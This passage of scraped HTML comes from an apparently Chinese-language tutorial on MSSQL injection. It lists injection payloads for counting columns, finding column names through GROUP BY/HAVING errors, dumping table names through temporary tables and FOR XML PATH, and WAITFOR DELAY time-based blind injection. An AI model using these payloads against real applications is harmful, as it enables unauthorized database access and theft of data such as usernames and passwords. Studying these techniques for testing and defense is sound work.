YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="top: auto;left: auto;margin: 12px 279.2px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="" data-ratio="0.14694894146948942" src="图片/HACK学习呀_2018-12-10_干货MSSQL注入攻击与防御/5_79x7ZWuduyc3icIicuNSYCV7wCxnYA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibOskrUKLMf9zJEoniaQ99DeTpQo3ybK7KrFlPaGibs0qLpRyWU79x7ZWuduyc3icIicuNSYCV7wCxnYA/640?wx_fmt=png'" data-type="png" data-w="803" style="vertical-align: middle;border-style: none;display: block;margin: 0px;" title="t019c455944529aec6f.png"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">测试列数</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs apache" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">ORDER</span>&nbsp;BY&nbsp;n+1;</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">实例:</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">query:&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;username,&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">password</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">FROM</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">Users</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">WHERE</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">id</span>&nbsp;=&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'1'</span>;
1'&nbsp;ORDER&nbsp;BY&nbsp;1<span class="hljs-comment" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 136);font-style: italic;">--&nbsp;True</span>1'&nbsp;ORDER&nbsp;BY&nbsp;2<span class="hljs-comment" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 136);font-style: italic;">--&nbsp;True</span>1'&nbsp;ORDER&nbsp;BY&nbsp;3<span class="hljs-comment" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 136);font-style: italic;">--&nbsp;False&nbsp;-&nbsp;查询使用了2列</span>-1'&nbsp;UNION&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>,<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">2</span><span class="hljs-comment" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 136);font-style: italic;">--&nbsp;&nbsp;True</span><span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">GROUP</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">BY</span>&nbsp;/&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">HAVING</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">实例：</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">query:&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;username,&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">password</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">FROM</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">Users</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">WHERE</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">id</span>&nbsp;=&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'1'</span>;
1'&nbsp;HAVING&nbsp;1=1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 136);font-style: italic;">--&nbsp;错误</span>1'&nbsp;GROUP&nbsp;BY&nbsp;username&nbsp;HAVING&nbsp;1=1<span class="hljs-comment" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 136);font-style: italic;">--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--&nbsp;错误</span>1'&nbsp;GROUP&nbsp;BY&nbsp;username,&nbsp;password&nbsp;HAVING&nbsp;1=1<span class="hljs-comment" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 136);font-style: italic;">--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--&nbsp;正确</span>Group&nbsp;By可以用来测试列名</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">获取表名</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="top: auto;left: auto;margin: 12px 279.2px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="" data-ratio="0.2894409937888199" src="图片/HACK学习呀_2018-12-10_干货MSSQL注入攻击与防御/6_gj6LspyXwxFpH3oUuZwMiaDicadiaw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibOskrUKLMf9zJEoniaQ99DelXibk1SR1P6O7MXjGT3MJn8RWaXdgj6LspyXwxFpH3oUuZwMiaDicadiaw/640?wx_fmt=png'" data-type="png" data-w="805" style="vertical-align: middle;border-style: none;display: block;margin: 0px;" title="t01d09f90cdd0c29df8.png"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">这里使用的U表示用户表，还有视图和存储过程分别表示为 &nbsp; &nbsp;U = 用户表, V = 视图 , X = 扩展存储过程</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">获取列名</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="top: auto;left: auto;margin: 12px 279.2px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="" data-ratio="0.4124223602484472" src="图片/HACK学习呀_2018-12-10_干货MSSQL注入攻击与防御/7_bzlrTAhF21ib1WLZcr8BBvCYe5xPCg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibOskrUKLMf9zJEoniaQ99DeUtsCa1zVtRQiceqGtibCyy024R8ibzlrTAhF21ib1WLZcr8BBvCYe5xPCg/640?wx_fmt=png'" data-type="png" data-w="805" style="vertical-align: middle;border-style: none;display: block;margin: 0px;" title="t01459daff63390896c.png"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">接收多条数据</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">临时表</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">除了上述的查询方式在MSSQL中可以使用临时表来查看数据,步骤如下</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">//1.创建临时表/列和插入数据：<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">BEGIN</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">DECLARE</span>&nbsp;@<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">test</span>&nbsp;<span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">varchar</span>(<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">8000</span>)&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SET</span>&nbsp;@<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">test</span>=<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">':'</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;@<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">test</span>=@<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">test</span>+<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'&nbsp;'</span>+<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">name</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">FROM</span>&nbsp;sysobjects&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">WHERE</span>&nbsp;xtype=<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'U'</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">AND</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">name</span>&gt;@<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">test</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;@<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">test</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">AS</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">test</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">INTO</span>&nbsp;TMP_DB&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">END</span>;
//2.转储内容：<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;TOP&nbsp;<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SUBSTRING</span>(<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">test</span>,<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>,<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">353</span>)&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">FROM</span>&nbsp;TMP_DB;
//3.删除表：<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">DROP</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">TABLE</span>&nbsp;TMP_DB;</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">XML列数据</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;table_name&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">FROM</span>&nbsp;information_schema.tables&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">FOR</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">XML</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">PATH</span>(<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">''</span>)</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">字符串连接符</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">相对于MySQL来说少了两个函数,有如下方式连接:</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">CONCAT</span>(<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'a'</span>,<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'a'</span>,<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'a'</span>);&nbsp;(SQL&nbsp;SERVER&nbsp;2012)<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'a'</span>+<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'d'</span>+<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'mi'</span>+<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'n'</span>;</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">条件语句&amp;时间</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">条件语句</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs php" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">IF</span>...<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">ELSE</span>...<span class="hljs-comment" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 136);font-style: italic;">//注意IF是不能再SELECT语句中使用的</span><span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">CASE</span>...WHEN...<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">ELSE</span>...</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">实例:</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">IF&nbsp;1=1&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'true'</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">ELSE</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'false'</span>;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">CASE</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">WHEN</span>&nbsp;<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>=<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">THEN</span>&nbsp;<span class="hljs-literal" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">true</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">ELSE</span>&nbsp;<span class="hljs-literal" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">false</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">END</span>;</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">时间</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs php" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">WAITFOR&nbsp;DELAY&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'time_to_pass'</span>;
WAITFOR&nbsp;TIME&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'time_to_execute'</span>;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">IF</span>&nbsp;<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>=<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>&nbsp;WAITFOR&nbsp;DELAY&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'0:0:5'</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">ELSE</span>&nbsp;WAITFOR&nbsp;DELAY&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'0:0:0'</span>;<span class="hljs-comment" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 136);font-style: italic;">//这里表示,如果条件成立,延迟5s</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: 